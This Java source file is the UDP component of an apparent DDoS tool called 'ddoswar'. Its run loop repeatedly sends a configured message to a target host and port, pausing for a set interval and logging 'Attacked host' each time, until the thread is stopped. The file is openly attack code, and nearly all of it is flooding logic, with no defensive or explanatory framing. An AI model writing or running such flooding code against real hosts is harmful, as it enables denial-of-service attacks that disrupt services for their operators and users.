package ua.cc.lajdev.ddoswar.protocols.interfaces;

import ua.cc.lajdev.ddoswar.DDOSPattern;
import ua.cc.lajdev.ddoswar.DDOSer;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

/**
 * This is the UDP implementation of the DDOS.
 *
 */
public abstract class UDP extends DDOS {
    private DatagramSocket socket;
    private DatagramPacket packet;

    /**
     * Constructor.
     * Create a UDP DDOS with a specified DDOS Pattern.
     *
     * @param ddosPattern
     */
    public UDP(DDOSPattern ddosPattern, DDOSer ddoSer) {
        super(ddosPattern, ddoSer);
    }

    /**
     * This is the "main" method.
     * The whole action happens here:
     * - Open the socket
     * - Connect the socket
     * - Write something to the socket
     * - Close the socket
     */
    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while (!Thread.currentThread().isInterrupted() && !socket.isClosed() && ddoSer.stopThread != true) {
            writeLineToSocket(getDdosPattern().getMessage());
            DDOSer.appendToConsole("Attacked host " + getAddress());
            try {
                Thread.sleep(getDdosPattern().getTimeout());
            } catch (InterruptedException ex) {
                System.out.println("Attack stoped: (" + getAddress() + ")");
            }
        }
        closeSocket();
    }

    /**
     * Create the socket
     */
    protected void createSocket() {
        try {
            socket = new DatagramSocket(0);
            socket.setSoTimeout(getDdosPattern().getSocketTimeout());
        } catch (SocketException ex) {
            DDOSer.appendToConsole("Error while creating or accessing a Socket! " + ex.getMessage());
        }
    }

    /**
     * This method writes something (Protocol dependent) to the socket.
     *
     * @param message
     */
    public abstract void writeLineToSocket(String message);

    /**
     * Connect to the socket.
     */
    protected void connectToSocket() {
        setAddress(new InetSocketAddress(getDdosPattern().getHost(), getDdosPattern().getPort()));
        packet = new DatagramPacket(new byte[1], 1, getAddress());
    }

    /**
     * Close the socket
     */
    protected void closeSocket() {
        if (socket != null && !socket.isClosed() && socket.isBound()) {
            socket.close();
        }
    }

    /**
     * Get the Socket
     *
     * @return
     */
    public DatagramSocket getSocket() {
        return socket;
    }

    /**
     * Set the socket
     *
     * @param socket
     */
    public void setSocket(DatagramSocket socket) {
        this.socket = socket;
    }

    /**
     * Get the packet
     *
     * @return
     */
    public DatagramPacket getPacket() {
        return packet;
    }

    /**
     * Set the packet
     *
     * @param packet
     */
    public void setPacket(DatagramPacket packet) {
        this.packet = packet;
    }
}
